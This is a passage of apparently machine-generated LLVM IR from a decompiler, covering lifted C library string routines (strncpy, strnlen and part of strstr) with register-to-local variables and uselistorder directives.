  %v1_1000e8b0 = add i32 %v1_1000e8a4, 2
  %v2_1000e8b0 = inttoptr i32 %v1_1000e8b0 to i8*
  %v3_1000e8b0 = load i8, i8* %v2_1000e8b0, align 1
  %v3_1000e8b4 = icmp eq i8 %v3_1000e8b0, 0
  br i1 %v3_1000e8b4, label %dec_label_pc_1000e8bc, label %dec_label_pc_1000e8c8

dec_label_pc_1000e8bc:                            ; preds = %dec_label_pc_1000e8b0
  %v2_1000e8bc = sub i32 %v1_1000e8a4, %v0_1000e83c
  %v1_1000e8c0 = add i32 %v2_1000e8bc, 2
  ret i32 %v1_1000e8c0

dec_label_pc_1000e8c8:                            ; preds = %dec_label_pc_1000e8b0
  %v1_1000e8c8 = add i32 %v1_1000e8a4, 3
  %v2_1000e8c8 = inttoptr i32 %v1_1000e8c8 to i8*
  %v3_1000e8c8 = load i8, i8* %v2_1000e8c8, align 1
  %v3_1000e8cc = icmp eq i8 %v3_1000e8c8, 0
  br i1 %v3_1000e8cc, label %dec_label_pc_1000e8d4, label %dec_label_pc_1000e868

dec_label_pc_1000e8d4:                            ; preds = %dec_label_pc_1000e8c8
  %v2_1000e8d4 = sub i32 %v1_1000e8a4, %v0_1000e83c
  %v1_1000e8d8 = add i32 %v2_1000e8d4, 3
  ret i32 %v1_1000e8d8

; uselistorder directives
  uselistorder i32 %v1_1000e86c, { 1, 0 }
  uselistorder i32 %v1_1000e8a4, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000e850, { 1, 0, 2 }
  uselistorder i32 %v0_1000e83c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e890, { 1, 0 }
  uselistorder label %dec_label_pc_1000e844, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000e8e0 = icmp eq i32 %arg2, 3
  store i1 %v3_1000e8e0, i1* %cr7_eq.global-to-local, align 1
  %v1_1000e8e4 = add i32 %arg1, -1
  store i32 %v1_1000e8e4, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000e960, label %dec_label_pc_1000e8ec

dec_label_pc_1000e8ec:                            ; preds = %entry
  %v1_1000e8ec = udiv i32 %arg2, 4
  store i32 %v1_1000e8ec, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e8f4

dec_label_pc_1000e8f4:                            ; preds = %dec_label_pc_1000e944, %dec_label_pc_1000e8ec
  %v2_1000e904 = phi i32 [ %v3_1000e93c, %dec_label_pc_1000e944 ], [ %v1_1000e8e4, %dec_label_pc_1000e8ec ]
  %v0_1000e8f4 = load i32, i32* @r4, align 4
  %v1_1000e8f4 = inttoptr i32 %v0_1000e8f4 to i8*
  %v2_1000e8f4 = load i8, i8* %v1_1000e8f4, align 1
  %v1_1000e8f8 = add i32 %v0_1000e8f4, 1
  store i32 %v1_1000e8f8, i32* %r10.global-to-local, align 4
  %v1_1000e8fc = add i32 %v0_1000e8f4, 2
  store i32 %v1_1000e8fc, i32* @r8, align 4
  %v3_1000e900 = icmp eq i8 %v2_1000e8f4, 0
  store i1 %v3_1000e900, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e904 = add i32 %v2_1000e904, 1
  %v4_1000e904 = inttoptr i32 %v3_1000e904 to i8*
  store i8 %v2_1000e8f4, i8* %v4_1000e904, align 1
  store i32 %v3_1000e904, i32* %r11.global-to-local, align 4
  %v0_1000e908 = load i32, i32* @r8, align 4
  %v1_1000e908 = add i32 %v0_1000e908, 1
  store i32 %v1_1000e908, i32* %r9.global-to-local, align 4
  %v0_1000e90c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e90c, label %dec_label_pc_1000e94c, label %dec_label_pc_1000e910

dec_label_pc_1000e910:                            ; preds = %dec_label_pc_1000e8f4
  %v0_1000e910 = load i32, i32* @r4, align 4
  %v1_1000e910 = add i32 %v0_1000e910, 1
  %v2_1000e910 = inttoptr i32 %v1_1000e910 to i8*
  %v3_1000e910 = load i8, i8* %v2_1000e910, align 1
  %v1_1000e914 = add i32 %v0_1000e908, 2
  store i32 %v1_1000e914, i32* @r4, align 4
  %v3_1000e918 = icmp eq i8 %v3_1000e910, 0
  store i1 %v3_1000e918, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e91c = add i32 %v2_1000e904, 2
  %v4_1000e91c = inttoptr i32 %v3_1000e91c to i8*
  store i8 %v3_1000e910, i8* %v4_1000e91c, align 1
  store i32 %v3_1000e91c, i32* %r11.global-to-local, align 4
  %v0_1000e920 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e920, label %dec_label_pc_1000e94c, label %dec_label_pc_1000e924

dec_label_pc_1000e924:                            ; preds = %dec_label_pc_1000e910
  %v0_1000e924 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e924 = add i32 %v0_1000e924, 1
  %v2_1000e924 = inttoptr i32 %v1_1000e924 to i8*
  %v3_1000e924 = load i8, i8* %v2_1000e924, align 1
  %v3_1000e928 = icmp eq i8 %v3_1000e924, 0
  store i1 %v3_1000e928, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e92c = add i32 %v2_1000e904, 3
  %v4_1000e92c = inttoptr i32 %v3_1000e92c to i8*
  store i8 %v3_1000e924, i8* %v4_1000e92c, align 1
  store i32 %v3_1000e92c, i32* %r11.global-to-local, align 4
  %v0_1000e930 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e930, label %dec_label_pc_1000e94c, label %dec_label_pc_1000e934

dec_label_pc_1000e934:                            ; preds = %dec_label_pc_1000e924
  %v0_1000e934 = load i32, i32* @r8, align 4
  %v1_1000e934 = add i32 %v0_1000e934, 1
  %v2_1000e934 = inttoptr i32 %v1_1000e934 to i8*
  %v3_1000e934 = load i8, i8* %v2_1000e934, align 1
  %v3_1000e938 = icmp eq i8 %v3_1000e934, 0
  store i1 %v3_1000e938, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e93c = add i32 %v2_1000e904, 4
  %v4_1000e93c = inttoptr i32 %v3_1000e93c to i8*
  store i8 %v3_1000e934, i8* %v4_1000e93c, align 1
  store i32 %v3_1000e93c, i32* %r11.global-to-local, align 4
  %v0_1000e940 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e940, label %dec_label_pc_1000e94c, label %dec_label_pc_1000e944

dec_label_pc_1000e944:                            ; preds = %dec_label_pc_1000e934
  %v0_1000e944 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e944 = add i32 %v0_1000e944, -1
  store i32 %v1_1000e944, i32* %ctr.global-to-local, align 4
  %v2_1000e944 = icmp eq i32 %v1_1000e944, 0
  br i1 %v2_1000e944, label %dec_label_pc_1000e960, label %dec_label_pc_1000e8f4

dec_label_pc_1000e94c:                            ; preds = %dec_label_pc_1000e934, %dec_label_pc_1000e924, %dec_label_pc_1000e910, %dec_label_pc_1000e8f4
  %v1_1000e94c = phi i32 [ %v3_1000e93c, %dec_label_pc_1000e934 ], [ %v3_1000e92c, %dec_label_pc_1000e924 ], [ %v3_1000e91c, %dec_label_pc_1000e910 ], [ %v3_1000e904, %dec_label_pc_1000e8f4 ]
  %v2_1000e94c11 = sub i32 %arg1, %v1_1000e94c
  %v2_1000e950 = add i32 %v2_1000e94c11, %arg2
  %v1_1000e954 = add i32 %v2_1000e950, -1
  store i32 %v1_1000e954, i32* %r9.global-to-local, align 4
  %v4_1000e954 = icmp eq i32 %v1_1000e954, 0
  %v0_1000e958 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000e954, i32 %v0_1000e958)
  %v2_1000e990.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e988

dec_label_pc_1000e960:                            ; preds = %dec_label_pc_1000e944, %entry
  %v1_1000e960 = urem i32 %arg2, 4
  store i32 %v1_1000e960, i32* %r9.global-to-local, align 4
  %v3_1000e960 = icmp eq i32 %v1_1000e960, 0
  %v0_1000e964 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e960, i32 %v0_1000e964)
  store i32 %v1_1000e960, i32* %ctr.global-to-local, align 4
  %v2_1000e97c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e96c

dec_label_pc_1000e96c:                            ; preds = %dec_label_pc_1000e984.dec_label_pc_1000e96c_crit_edge, %dec_label_pc_1000e960
  %v2_1000e97c = phi i32 [ %v3_1000e97c, %dec_label_pc_1000e984.dec_label_pc_1000e96c_crit_edge ], [ %v2_1000e97c.pre, %dec_label_pc_1000e960 ]
  %v0_1000e970 = phi i32 [ %v0_1000e970.pre, %dec_label_pc_1000e984.dec_label_pc_1000e96c_crit_edge ], [ %v1_1000e960, %dec_label_pc_1000e960 ]
  %v0_1000e96c = load i32, i32* @r4, align 4
  %v1_1000e96c = inttoptr i32 %v0_1000e96c to i8*
  %v2_1000e96c = load i8, i8* %v1_1000e96c, align 1
  %v1_1000e970 = add i32 %v0_1000e970, -1
  store i32 %v1_1000e970, i32* %r9.global-to-local, align 4
  %v1_1000e974 = add i32 %v0_1000e96c, 1
  store i32 %v1_1000e974, i32* @r4, align 4
  %v3_1000e978 = icmp eq i8 %v2_1000e96c, 0
  store i1 %v3_1000e978, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e97c = add i32 %v2_1000e97c, 1
  %v4_1000e97c = inttoptr i32 %v3_1000e97c to i8*
  store i8 %v2_1000e96c, i8* %v4_1000e97c, align 1
  store i32 %v3_1000e97c, i32* %r11.global-to-local, align 4
  %v0_1000e980 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e980 = add i32 %v0_1000e980, -1
  store i32 %v1_1000e980, i32* %ctr.global-to-local, align 4
  %v2_1000e980 = icmp eq i32 %v1_1000e980, 0
  br i1 %v2_1000e980, label %dec_label_pc_1000e998, label %dec_label_pc_1000e984

dec_label_pc_1000e984:                            ; preds = %dec_label_pc_1000e96c
  %v0_1000e984 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e984, label %dec_label_pc_1000e988, label %dec_label_pc_1000e984.dec_label_pc_1000e96c_crit_edge

dec_label_pc_1000e984.dec_label_pc_1000e96c_crit_edge: ; preds = %dec_label_pc_1000e984
  %v0_1000e970.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e96c

dec_label_pc_1000e988:                            ; preds = %dec_label_pc_1000e984, %dec_label_pc_1000e94c
  %v2_1000e990.pre = phi i32 [ %v2_1000e990.pre.pre, %dec_label_pc_1000e94c ], [ %v3_1000e97c, %dec_label_pc_1000e984 ]
  %v0_1000e988 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000e988, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e98c

dec_label_pc_1000e98c:                            ; preds = %dec_label_pc_1000e98c, %dec_label_pc_1000e988
  %v2_1000e990 = phi i32 [ %v3_1000e990, %dec_label_pc_1000e98c ], [ %v2_1000e990.pre, %dec_label_pc_1000e988 ]
  %v3_1000e990 = add i32 %v2_1000e990, 1
  %v4_1000e990 = inttoptr i32 %v3_1000e990 to i8*
  store i8 0, i8* %v4_1000e990, align 1
  store i32 %v3_1000e990, i32* %r11.global-to-local, align 4
  %v0_1000e994 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e994 = add i32 %v0_1000e994, -1
  store i32 %v1_1000e994, i32* %ctr.global-to-local, align 4
  %v2_1000e994 = icmp eq i32 %v1_1000e994, 0
  br i1 %v2_1000e994, label %dec_label_pc_1000e998, label %dec_label_pc_1000e98c

dec_label_pc_1000e998:                            ; preds = %dec_label_pc_1000e96c, %dec_label_pc_1000e98c
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000e994, { 1, 0 }
  uselistorder i32 %v3_1000e990, { 1, 2, 0 }
  uselistorder i32 %v1_1000e980, { 1, 0 }
  uselistorder i32 %v3_1000e97c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000e960, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000e944, { 1, 0 }
  uselistorder i32 %v3_1000e93c, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e998, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000e99c = load i32, i32* @r4, align 4
  %v3_1000e99c = icmp eq i32 %v0_1000e99c, 0
  %v0_1000e9a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e99c, i32 %v0_1000e9a8)
  %v1_1000e9b8 = load i32, i32* @r4, align 4
  %v2_1000e9b8 = add i32 %v1_1000e9b8, %tmp
  %v3_1000e9bc = icmp ugt i32 %v2_1000e9b8, %tmp
  %v4_1000e9bc = icmp eq i32 %v1_1000e9b8, 0
  %v2_1000e9c0 = or i1 %v4_1000e9bc, %v3_1000e9bc
  br i1 %v2_1000e9c0, label %dec_label_pc_1000e9c8, label %dec_label_pc_1000e9c4

dec_label_pc_1000e9b0:                            ; preds = %dec_label_pc_1000ea30
  br label %dec_label_pc_1000ea74

dec_label_pc_1000e9c4:                            ; preds = %entry
  br label %dec_label_pc_1000e9c8

dec_label_pc_1000e9c8:                            ; preds = %entry, %dec_label_pc_1000e9c4
  %v0_1000ea78 = phi i32 [ %v2_1000e9b8, %entry ], [ -1, %dec_label_pc_1000e9c4 ]
  %v1_1000e9f86 = urem i32 %tmp, 4
  %v3_1000e9f88 = icmp eq i32 %v1_1000e9f86, 0
  br i1 %v3_1000e9f88, label %dec_label_pc_1000ea00, label %dec_label_pc_1000e9d0

dec_label_pc_1000e9d0:                            ; preds = %dec_label_pc_1000e9c8, %dec_label_pc_1000e9f4
  %v0_1000e9e8 = phi i32 [ %v1_1000e9f4, %dec_label_pc_1000e9f4 ], [ %tmp, %dec_label_pc_1000e9c8 ]
  %v1_1000e9d0 = inttoptr i32 %v0_1000e9e8 to i8*
  %v2_1000e9d0 = load i8, i8* %v1_1000e9d0, align 1
  %v3_1000e9d4 = icmp eq i8 %v2_1000e9d0, 0
  br i1 %v3_1000e9d4, label %dec_label_pc_1000e9dc, label %dec_label_pc_1000e9f4

dec_label_pc_1000e9dc:                            ; preds = %dec_label_pc_1000e9d0
  %v3_1000e9dc = icmp ugt i32 %v0_1000ea78, %v0_1000e9e8
  %v0_1000e9e8.v0_1000ea78 = select i1 %v3_1000e9dc, i32 %v0_1000e9e8, i32 %v0_1000ea78
  %v2_1000e9ec = sub i32 %v0_1000e9e8.v0_1000ea78, %tmp
  ret i32 %v2_1000e9ec

dec_label_pc_1000e9f4:                            ; preds = %dec_label_pc_1000e9d0
  %v1_1000e9f4 = add i32 %v0_1000e9e8, 1
  %v1_1000e9f8 = urem i32 %v1_1000e9f4, 4
  %v3_1000e9f8 = icmp eq i32 %v1_1000e9f8, 0
  br i1 %v3_1000e9f8, label %dec_label_pc_1000ea00, label %dec_label_pc_1000e9d0

dec_label_pc_1000ea00:                            ; preds = %dec_label_pc_1000e9f4, %dec_label_pc_1000e9c8
  %v0_1000ea04 = phi i32 [ %tmp, %dec_label_pc_1000e9c8 ], [ %v1_1000e9f4, %dec_label_pc_1000e9f4 ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_1000ea6c3 = icmp ult i32 %v0_1000ea04, %v0_1000ea78
  br i1 %v2_1000ea6c3, label %dec_label_pc_1000ea10, label %dec_label_pc_1000ea74

dec_label_pc_1000ea10:                            ; preds = %dec_label_pc_1000ea00, %dec_label_pc_1000ea68
  %v0_1000e9b0 = phi i32 [ %v1_1000ea14, %dec_label_pc_1000ea68 ], [ %v0_1000ea04, %dec_label_pc_1000ea00 ]
  %v1_1000ea10 = inttoptr i32 %v0_1000e9b0 to i32*
  %v2_1000ea10 = load i32, i32* %v1_1000ea10, align 4
  %v1_1000ea14 = add i32 %v0_1000e9b0, 4
  store i32 %v0_1000e9b0, i32* @r8, align 4
  %v1_1000ea20 = add i32 %v2_1000ea10, -16843009
  %v2_1000ea24 = and i32 %v1_1000ea20, -2139062144
  %v5_1000ea24 = icmp eq i32 %v2_1000ea24, 0
  %v1_1000ea28 = add i32 %v0_1000e9b0, 1
  br i1 %v5_1000ea24, label %dec_label_pc_1000ea68, label %dec_label_pc_1000ea30

dec_label_pc_1000ea30:                            ; preds = %dec_label_pc_1000ea10
  %v2_1000ea30 = inttoptr i32 %v0_1000e9b0 to i8*
  %v3_1000ea30 = load i8, i8* %v2_1000ea30, align 1
  %v3_1000ea34 = icmp eq i8 %v3_1000ea30, 0
  br i1 %v3_1000ea34, label %dec_label_pc_1000e9b0, label %dec_label_pc_1000ea3c

dec_label_pc_1000ea3c:                            ; preds = %dec_label_pc_1000ea30
  %v2_1000ea3c = inttoptr i32 %v1_1000ea28 to i8*
  %v3_1000ea3c = load i8, i8* %v2_1000ea3c, align 1
  %v3_1000ea40 = icmp eq i8 %v3_1000ea3c, 0
  br i1 %v3_1000ea40, label %dec_label_pc_1000ea74, label %dec_label_pc_1000ea48

dec_label_pc_1000ea48:                            ; preds = %dec_label_pc_1000ea3c
  %v1_1000ea48 = add i32 %v0_1000e9b0, 2
  %v2_1000ea48 = inttoptr i32 %v1_1000ea48 to i8*
  %v3_1000ea48 = load i8, i8* %v2_1000ea48, align 1
  %v3_1000ea50 = icmp eq i8 %v3_1000ea48, 0
  br i1 %v3_1000ea50, label %dec_label_pc_1000ea74, label %dec_label_pc_1000ea58

dec_label_pc_1000ea58:                            ; preds = %dec_label_pc_1000ea48
  %v1_1000ea58 = add i32 %v0_1000e9b0, 3
  %v2_1000ea58 = inttoptr i32 %v1_1000ea58 to i8*
  %v3_1000ea58 = load i8, i8* %v2_1000ea58, align 1
  %v3_1000ea60 = icmp eq i8 %v3_1000ea58, 0
  br i1 %v3_1000ea60, label %dec_label_pc_1000ea74, label %dec_label_pc_1000ea68

dec_label_pc_1000ea68:                            ; preds = %dec_label_pc_1000ea58, %dec_label_pc_1000ea10
  %v2_1000ea6c = icmp ult i32 %v1_1000ea14, %v0_1000ea78
  br i1 %v2_1000ea6c, label %dec_label_pc_1000ea10, label %dec_label_pc_1000ea74

dec_label_pc_1000ea74:                            ; preds = %dec_label_pc_1000ea68, %dec_label_pc_1000ea3c, %dec_label_pc_1000ea48, %dec_label_pc_1000ea58, %dec_label_pc_1000ea00, %dec_label_pc_1000e9b0
  %v0_1000ea80 = phi i32 [ %v0_1000e9b0, %dec_label_pc_1000e9b0 ], [ %v0_1000ea04, %dec_label_pc_1000ea00 ], [ %v1_1000ea58, %dec_label_pc_1000ea58 ], [ %v1_1000ea48, %dec_label_pc_1000ea48 ], [ %v1_1000ea28, %dec_label_pc_1000ea3c ], [ %v0_1000ea78, %dec_label_pc_1000ea68 ]
  %v3_1000ea74 = icmp ugt i32 %v0_1000ea78, %v0_1000ea80
  %v0_1000ea80.v0_1000ea78 = select i1 %v3_1000ea74, i32 %v0_1000ea80, i32 %v0_1000ea78
  %v2_1000ea84 = sub i32 %v0_1000ea80.v0_1000ea78, %tmp
  ret i32 %v2_1000ea84

; uselistorder directives
  uselistorder i32 %v1_1000ea14, { 1, 0 }
  uselistorder i32 %v0_1000e9b0, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000ea04, { 1, 0, 2 }
  uselistorder i32 %v1_1000e9f4, { 1, 0, 2 }
  uselistorder i32 %v0_1000e9e8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000ea78, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000e9b8, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000ea74, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000ea10, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9c8, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000ea8c = load i8, i8* %arg2, align 1
  %v4_1000ea8c = zext i8 %v3_1000ea8c to i32
  store i32 %v4_1000ea8c, i32* %r6.global-to-local, align 4
  %v3_1000ea90 = icmp eq i8 %v3_1000ea8c, 0
  %v0_1000ea94 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ea90, i32 %v0_1000ea94)
  %v1_1000ea98 = add i32 %arg1, -1
  store i32 %v1_1000ea98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ea9c

dec_label_pc_1000ea9c:                            ; preds = %dec_label_pc_1000eaac, %entry
  %v0_1000ea9c = phi i32 [ %v1_1000ea9c, %dec_label_pc_1000eaac ], [ %v1_1000ea98, %entry ]
  %v1_1000ea9c = add i32 %v0_1000ea9c, 1
  %v2_1000ea9c = inttoptr i32 %v1_1000ea9c to i8*
  %v3_1000ea9c = load i8, i8* %v2_1000ea9c, align 1
  store i32 %v1_1000ea9c, i32* %r3.global-to-local, align 4
  %v3_1000eaa0 = icmp eq i8 %v3_1000ea9c, 0
  br i1 %v3_1000eaa0, label %dec_label_pc_1000eb78, label %dec_label_pc_1000eaac

dec_label_pc_1000eaac:                            ; preds = %dec_label_pc_1000ea9c
  %v4_1000eaa4 = icmp eq i8 %v3_1000ea9c, %v3_1000ea8c
  br i1 %v4_1000eaa4, label %dec_label_pc_1000eab0, label %dec_label_pc_1000ea9c

dec_label_pc_1000eab0:                            ; preds = %dec_label_pc_1000eaac
  %v2_1000eab0 = add i32 %tmp, 1
  %v3_1000eab0 = inttoptr i32 %v2_1000eab0 to i8*
  %v4_1000eab0 = load i8, i8* %v3_1000eab0, align 1
  %v5_1000eab0 = zext i8 %v4_1000eab0 to i32
  store i32 %v5_1000eab0, i32* %r5.global-to-local, align 4
  store i32 %v2_1000eab0, i32* %r4.global-to-local, align 4
  %v3_1000eab8 = icmp eq i8 %v4_1000eab0, 0
  %v0_1000eabc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000eab8, i32 %v0_1000eabc)
  %v0_1000eac0.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000eb04

dec_label_pc_1000eacc:                            ; preds = %dec_label_pc_1000eb6c
  %v3_1000eacc = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000eacc = zext i8 %v3_1000eacc to i32
  store i32 %v1_1000eac0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000eaf4.preheader

dec_label_pc_1000eaf4.preheader:                  ; preds = %dec_label_pc_1000eacc, %dec_label_pc_1000eb04
  %v0_1000eaf417 = phi i32 [ %v4_1000eacc, %dec_label_pc_1000eacc ], [ %storemerge4, %dec_label_pc_1000eb04 ]
  %v1_1000eaf4.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000eaf425 = icmp eq i32 %v0_1000eaf417, %v1_1000eaf4.pre
  %v3_1000eaf827 = icmp eq i32 %v0_1000eaf417, 0
  br i1 %v4_1000eaf425, label %dec_label_pc_1000eb04, label %dec_label_pc_1000ead8

dec_label_pc_1000ead8:                            ; preds = %dec_label_pc_1000eaf4.preheader, %dec_label_pc_1000eaf0
  %v3_1000eaf829 = phi i1 [ %v3_1000eaf8, %dec_label_pc_1000eaf0 ], [ %v3_1000eaf827, %dec_label_pc_1000eaf4.preheader ]
  %v0_1000eadc28 = phi i32 [ %v1_1000eaf0, %dec_label_pc_1000eaf0 ], [ %v1_1000eac0, %dec_label_pc_1000eaf4.preheader ]
  br i1 %v3_1000eaf829, label %dec_label_pc_1000eb78, label %dec_label_pc_1000eadc

dec_label_pc_1000eadc:                            ; preds = %dec_label_pc_1000ead8
  %v1_1000eadc = add i32 %v0_1000eadc28, 1
  %v2_1000eadc = inttoptr i32 %v1_1000eadc to i8*
  %v3_1000eadc = load i8, i8* %v2_1000eadc, align 1
  %v4_1000eadc = zext i8 %v3_1000eadc to i32
  store i32 %v1_1000eadc, i32* %r11.global-to-local, align 4
  %v4_1000eae0 = icmp eq i32 %v4_1000eadc, %v1_1000eaf4.pre
  br i1 %v4_1000eae0, label %dec_label_pc_1000eb04, label %dec_label_pc_1000eaec

dec_label_pc_1000eaec:                            ; preds = %dec_label_pc_1000eadc
  %v3_1000eae4 = icmp eq i8 %v3_1000eadc, 0
  br i1 %v3_1000eae4, label %dec_label_pc_1000eb78, label %dec_label_pc_1000eaf0

dec_label_pc_1000eaf0:                            ; preds = %dec_label_pc_1000eaec
  %v1_1000eaf0 = add i32 %v0_1000eadc28, 2
  %v2_1000eaf0 = inttoptr i32 %v1_1000eaf0 to i8*
  %v3_1000eaf0 = load i8, i8* %v2_1000eaf0, align 1
  %v4_1000eaf0 = zext i8 %v3_1000eaf0 to i32
  store i32 %v1_1000eaf0, i32* %r11.global-to-local, align 4
  %v4_1000eaf4 = icmp eq i32 %v4_1000eaf0, %v1_1000eaf4.pre
  %v3_1000eaf8 = icmp eq i8 %v3_1000eaf0, 0
  br i1 %v4_1000eaf4, label %dec_label_pc_1000eb04, label %dec_label_pc_1000ead8

dec_label_pc_1000eb04:                            ; preds = %dec_label_pc_1000eaf4.preheader, %dec_label_pc_1000eaf0, %dec_label_pc_1000eadc, %dec_label_pc_1000eab0
  %v0_1000eac0.sink = phi i32 [ %v0_1000eac0.sink.pre, %dec_label_pc_1000eab0 ], [ %v1_1000eac0, %dec_label_pc_1000eaf4.preheader ], [ %v1_1000eaf0, %dec_label_pc_1000eaf0 ], [ %v1_1000eadc, %dec_label_pc_1000eadc ]
  %v1_1000eac0 = add i32 %v0_1000eac0.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000eac0 to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000eac0, i32* %r11.global-to-local, align 4
  %v1_1000eb04 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000eb04 = icmp eq i32 %storemerge4, %v1_1000eb04
  br i1 %v4_1000eb04, label %dec_label_pc_1000eb0c, label %dec_label_pc_1000eaf4.preheader

dec_label_pc_1000eb0c:                            ; preds = %dec_label_pc_1000eb04
  %v1_1000eb0c = add i32 %v0_1000eac0.sink, 2
  %v2_1000eb0c = inttoptr i32 %v1_1000eb0c to i8*
  %v3_1000eb0c = load i8, i8* %v2_1000eb0c, align 1
  %v4_1000eb0c = zext i8 %v3_1000eb0c to i32
  store i32 %v4_1000eb0c, i32* %r10.global-to-local, align 4
  store i32 %v0_1000eac0.sink, i32* %r3.global-to-local, align 4
  %v0_1000eb14 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000eb14 = add i32 %v0_1000eb14, 1
  %v2_1000eb14 = inttoptr i32 %v1_1000eb14 to i8*
  %v3_1000eb14 = load i8, i8* %v2_1000eb14, align 1
  %v4_1000eb14 = zext i8 %v3_1000eb14 to i32
  store i32 %v1_1000eb14, i32* %r8.global-to-local, align 4
  store i32 %v1_1000eb0c, i32* %r11.global-to-local, align 4
  %v4_1000eb20 = icmp eq i8 %v3_1000eb0c, %v3_1000eb14
  br i1 %v4_1000eb20, label %dec_label_pc_1000eb28, label %dec_label_pc_1000eb6c

dec_label_pc_1000eb28:                            ; preds = %dec_label_pc_1000eb0c, %dec_label_pc_1000eb54.dec_label_pc_1000eb28_crit_edge
  %v0_1000eb30 = phi i32 [ %v0_1000eb30.pre, %dec_label_pc_1000eb54.dec_label_pc_1000eb28_crit_edge ], [ %v1_1000eb14, %dec_label_pc_1000eb0c ]
  %v0_1000eb2c = phi i32 [ %v0_1000eb2c.pre, %dec_label_pc_1000eb54.dec_label_pc_1000eb28_crit_edge ], [ %v1_1000eb0c, %dec_label_pc_1000eb0c ]
  %v0_1000eb28 = phi i32 [ %v4_1000eb58, %dec_label_pc_1000eb54.dec_label_pc_1000eb28_crit_edge ], [ %v4_1000eb0c, %dec_label_pc_1000eb0c ]
  %v3_1000eb28 = icmp eq i32 %v0_1000eb28, 0
  %v1_1000eb2c = add i32 %v0_1000eb2c, 1
  store i32 %v1_1000eb2c, i32* %r7.global-to-local, align 4
  %v1_1000eb30 = add i32 %v0_1000eb30, 1
  store i32 %v1_1000eb30, i32* %r10.global-to-local, align 4
  %v0_1000eb34 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000eb28, i32 %v0_1000eb34)
  %v0_1000eb38 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000eb38 = add i32 %v0_1000eb38, 1
  %v2_1000eb38 = inttoptr i32 %v1_1000eb38 to i8*
